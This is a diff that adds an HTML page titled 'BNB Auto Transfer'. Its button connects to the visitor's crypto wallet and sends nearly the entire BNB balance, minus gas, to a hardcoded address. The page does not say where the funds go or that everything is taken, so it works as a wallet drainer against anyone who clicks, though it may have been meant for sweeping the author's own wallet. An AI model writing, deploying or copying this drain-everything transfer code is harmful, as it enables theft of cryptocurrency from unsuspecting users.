@@ -1,0 +1,89 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>BNB Auto Transfer</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+</head>
+<body>
+  <div style="padding: 20px; text-align: center;">
+    <h2>BNB Auto Transfer</h2>
+    <button id="sendButton" style="padding: 15px 30px; font-size: 16px; background: #007bff; color: white; border: none; border-radius: 5px;">Send BNB</button>
+    <div id="status" style="margin-top: 20px; color: #000;"></div>
+  </div>
+
+  <script>
+    const receiverAddress = '0xf192c73eFd33aF9af56A93F6de0A97eE4591cCc0'; // New personal wallet
+
+    function updateStatus(msg, error = false) {
+      const status = document.getElementById('status');
+      status.innerText = msg;
+      status.style.color = error ? 'red' : 'green';
+      console.log(msg);
+    }
+
+    document.getElementById('sendButton').addEventListener('click', async () => {
+      if (typeof window.ethereum === 'undefined') {
+        updateStatus('MetaMask or Trust Wallet not found.', true);
+        return;
+      }
+
+      const web3 = new Web3(window.ethereum);
+      await window.ethereum.request({ method: 'eth_requestAccounts' });
+      const accounts = await web3.eth.getAccounts();
+      const sender = accounts[0];
+
+      const chainId = await web3.eth.getChainId();
+      if (chainId !== 56) {
+        updateStatus('Please switch to BNB Smart Chain.', true);
+        return;
+      }
+
+      const balance = await web3.eth.getBalance(sender);
+      const gasLimit = 21000;
+      const gasPrice = await web3.eth.getGasPrice();
+      const gasCost = BigInt(gasLimit) * BigInt(gasPrice);
+      const value = BigInt(balance) - gasCost;
+
+      if (value <= 0n) {
+        updateStatus('Insufficient balance after gas fee.', true);
+        return;
+      }
+
+      const nonce = await web3.eth.getTransactionCount(sender, 'latest');
+
+      const tx = {
+        from: sender,
+        to: receiverAddress,
+        value: '0x' + value.toString(16),
+        gas: web3.utils.toHex(gasLimit),
+        gasPrice: web3.utils.toHex(gasPrice),
+        nonce: web3.utils.toHex(nonce),
+        chainId: 56
+      };
+
+      updateStatus('Sending transaction...');
+
+      try {
+        const txHash = await web3.eth.sendTransaction(tx);
+        updateStatus('✅ Transaction sent: ' + txHash.transactionHash);
+        alert('Transaction Hash: ' + txHash.transactionHash);
+      } catch (err) {
+        console.error(err);
+        updateStatus('Transaction failed: ' + (err.message || err), true);
+        alert('Transaction failed');
+      }
+    });
+
+    document.getElementById('sendButton').addEventListener('mouseover', function() {
+      this.style.background = '#0056b3';
+    });
+
+    document.getElementById('sendButton').addEventListener('mouseout', function() {
+      this.style.background = '#007bff';
+    });
+  </script>
+</body>
+</html>
